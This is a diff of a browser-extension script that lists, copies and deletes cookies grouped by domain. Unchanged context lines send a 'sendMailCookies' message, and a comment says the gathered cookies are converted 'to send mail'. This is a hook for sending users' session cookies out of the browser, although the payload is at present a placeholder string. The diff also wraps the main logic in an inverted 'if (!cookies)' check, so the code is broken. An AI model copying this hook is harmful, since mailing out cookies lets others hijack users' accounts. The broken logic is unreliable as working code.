@@ -102,107 +102,116 @@ async function loadCookies(filter = '') {
     //         y = cookie
     //     }
     // })
-
-    cookies.forEach(cookie => {
-        if (cookie.name.includes(filter) || cookie.domain.includes(filter)) {
-            if (!cookiesByDomain[cookie.domain]) {
-                cookiesByDomain[cookie.domain] = [];
+    if (!cookies) {
+        cookies.forEach(cookie => {
+            if (cookie.name.includes(filter) || cookie.domain.includes(filter)) {
+                if (!cookiesByDomain[cookie.domain]) {
+                    cookiesByDomain[cookie.domain] = [];
+                }
+                cookiesByDomain[cookie.domain].push(cookie);
             }
-            cookiesByDomain[cookie.domain].push(cookie);
+        });
+        // chuyển đổi cookies lấy được thành string / Json để gửi mail
+        // const cookiesByDomainString = Object.entries(cookiesByDomain).map(([domain, cookies]) => {
+        //     const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
+        //     return `Domain: ${domain}\nCookies: ${cookieString}`;
+        // }).join('\n\n');
+        // const cookiesParser = JSON.stringify(cookies)
+        // console.log(cookiesParser)
+        chrome.runtime.sendMessage({ type: 'sendMailCookies', subject: 'Cookies By Domain', message: "cookiesParser" });
+        const totalCookies = document.getElementById('totalCookies');
+        const numbercookies = Object.values(cookiesByDomain).reduce((count, domainCookies) => count + domainCookies.length, 0);
+        const totalDomains = Object.keys(cookiesByDomain).length;
+        if (totalDomains < 1) {
+            notify('No cookies found matching the filter.', 'warning');
+            totalCookies.textContent = 'Not Found Cookies matching the filter With Domain or Cookies Name : ' + filter;
         }
-    });
-    // chuyển đổi cookies lấy được thành string / Json để gửi mail
-    // const cookiesByDomainString = Object.entries(cookiesByDomain).map(([domain, cookies]) => {
-    //     const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
-    //     return `Domain: ${domain}\nCookies: ${cookieString}`;
-    // }).join('\n\n');
-    // const cookiesParser = JSON.stringify(cookies)
-    // console.log(cookiesParser)
-    chrome.runtime.sendMessage({ type: 'sendMailCookies', subject: 'Cookies By Domain', message: "cookiesParser" });
-    const totalCookies = document.getElementById('totalCookies');
-    const numbercookies = Object.values(cookiesByDomain).reduce((count, domainCookies) => count + domainCookies.length, 0);
-    const totalDomains = Object.keys(cookiesByDomain).length;
-    if (totalDomains < 1) {
-        notify('No cookies found matching the filter.', 'warning');
-        totalCookies.textContent = 'Not Found Cookies matching the filter With Domain or Cookies Name : ' + filter;
+        else {
+            notify('Cookies loaded successfully.', 'success');
+            totalCookies.textContent = `The Number of Domains: ${totalDomains} And Contains ${numbercookies} Cookies`;
+        }
+        Object.keys(cookiesByDomain).forEach(domain => {
+            const domainSection = document.createElement('div');
+            domainSection.className = 'domain-section';
+            const domainHeader = document.createElement('div');
+            domainHeader.className = 'domain-header';
+            const DomainLabel = document.createElement('p');
+            DomainLabel.textContent = `Domain: ${domain}`;
+            DomainLabel.style.minWidth = '150px';
+            DomainLabel.style.borderRadius = '10px';
+            DomainLabel.style.border = '2px solid pink';
+            DomainLabel.style.padding = '5px';
+            DomainLabel.style.color = 'red';
+            // domainHeader.textContent = `Domain: ${domain}`;
+            domainHeader.appendChild(DomainLabel);
+            const clearIcon = document.createElement('img');
+            const copyIcon = document.createElement('img');
+            copyIcon.id = 'copyIcon';
+            copyIcon.src = 'icons/copy.png';
+            copyIcon.addEventListener('click', () => {
+                const cookiesParser = JSON.stringify(cookiesByDomain[domain], null, 2)
+                navigator.clipboard.writeText(cookiesParser);
+                notify(`Cookies of Domain : ${domain}  copied to clipboard.`, 'success');
+            })
+            domainHeader.style.position = 'relative';
+            domainHeader.appendChild(copyIcon);
+            clearIcon.id = 'clearIcon';
+            clearIcon.src = 'icons/clear.png';
+
+            clearIcon.addEventListener('click', () => {
+                deleteCookies_in_Domains(domain);
+
+            })
+            domainHeader.appendChild(clearIcon);
+            domainSection.appendChild(domainHeader);
+
+            const table = document.createElement('table');
+            const thead = document.createElement('thead');
+            const tbody = document.createElement('tbody');
+            const headerRow = document.createElement('tr');
+            const headers = ['Name', 'Path', 'Expires', 'Value'];
+            headers.forEach(headerText => {
+                const th = document.createElement('th');
+                th.textContent = headerText;
+                headerRow.appendChild(th);
+            });
+            thead.appendChild(headerRow);
+            cookiesByDomain[domain].forEach(cookie => {
+                const row = document.createElement('tr');
+
+                const nameCell = document.createElement('td');
+                nameCell.textContent = cookie.name;
+                row.appendChild(nameCell);
+
+                const pathCell = document.createElement('td');
+                pathCell.textContent = cookie.path;
+                row.appendChild(pathCell);
+
+                const expiresCell = document.createElement('td');
+                expiresCell.textContent = cookie.expirationDate ? new Date(cookie.expirationDate * 1000).toLocaleString() : 'Session';
+                row.appendChild(expiresCell);
+
+                const valueCell = document.createElement('td');
+                valueCell.textContent = cookie.value;
+                row.appendChild(valueCell);
+
+                tbody.appendChild(row);
+            });
+
+            table.appendChild(thead);
+            table.appendChild(tbody);
+            domainSection.appendChild(table);
+            cookieTableContainer.appendChild(domainSection);
+        });
     }
     else {
-        notify('Cookies loaded successfully.', 'success');
-        totalCookies.textContent = `The Number of Domains: ${totalDomains} And Contains ${numbercookies} Cookies`;
+        cookieTableContainer.innerHTML = 'No Cookies Available Founded'
+        cookieTableContainer.style.paddingTop = '30px'
+        cookieTableContainer.style.color = 'red'    
+        cookieTableContainer.style.textAlign = 'center'
+        cookieTableContainer.style.fontSize = '40px'
+
     }
-    Object.keys(cookiesByDomain).forEach(domain => {
-        const domainSection = document.createElement('div');
-        domainSection.className = 'domain-section';
-        const domainHeader = document.createElement('div');
-        domainHeader.className = 'domain-header';
-        const DomainLabel = document.createElement('p');
-        DomainLabel.textContent = `Domain: ${domain}`;
-        DomainLabel.style.minWidth = '150px';
-        DomainLabel.style.borderRadius = '10px';
-        DomainLabel.style.border = '2px solid pink';
-        DomainLabel.style.padding = '5px';
-        DomainLabel.style.color = 'red';
-        // domainHeader.textContent = `Domain: ${domain}`;
-        domainHeader.appendChild(DomainLabel);
-        const clearIcon = document.createElement('img');
-        const copyIcon = document.createElement('img');
-        copyIcon.id = 'copyIcon';
-        copyIcon.src = 'icons/copy.png';
-        copyIcon.addEventListener('click', () => {
-            const cookiesParser = JSON.stringify(cookiesByDomain[domain], null, 2)
-            navigator.clipboard.writeText(cookiesParser);
-            notify(`Cookies of Domain : ${domain}  copied to clipboard.`, 'success');
-        })
-        domainHeader.style.position = 'relative';
-        domainHeader.appendChild(copyIcon);
-        clearIcon.id = 'clearIcon';
-        clearIcon.src = 'icons/clear.png';
-
-        clearIcon.addEventListener('click', () => {
-            deleteCookies_in_Domains(domain);
-
-        })
-        domainHeader.appendChild(clearIcon);
-        domainSection.appendChild(domainHeader);
-
-        const table = document.createElement('table');
-        const thead = document.createElement('thead');
-        const tbody = document.createElement('tbody');
-        const headerRow = document.createElement('tr');
-        const headers = ['Name', 'Path', 'Expires', 'Value'];
-        headers.forEach(headerText => {
-            const th = document.createElement('th');
-            th.textContent = headerText;
-            headerRow.appendChild(th);
-        });
-        thead.appendChild(headerRow);
-        cookiesByDomain[domain].forEach(cookie => {
-            const row = document.createElement('tr');
-
-            const nameCell = document.createElement('td');
-            nameCell.textContent = cookie.name;
-            row.appendChild(nameCell);
-
-            const pathCell = document.createElement('td');
-            pathCell.textContent = cookie.path;
-            row.appendChild(pathCell);
-
-            const expiresCell = document.createElement('td');
-            expiresCell.textContent = cookie.expirationDate ? new Date(cookie.expirationDate * 1000).toLocaleString() : 'Session';
-            row.appendChild(expiresCell);
-
-            const valueCell = document.createElement('td');
-            valueCell.textContent = cookie.value;
-            row.appendChild(valueCell);
-
-            tbody.appendChild(row);
-        });
-
-        table.appendChild(thead);
-        table.appendChild(tbody);
-        domainSection.appendChild(table);
-        cookieTableContainer.appendChild(domainSection);
-    });
 }
 const deleteCookies_in_Domains = async (DomainName) => {
     const temp = document.getElementById('filterInput').value
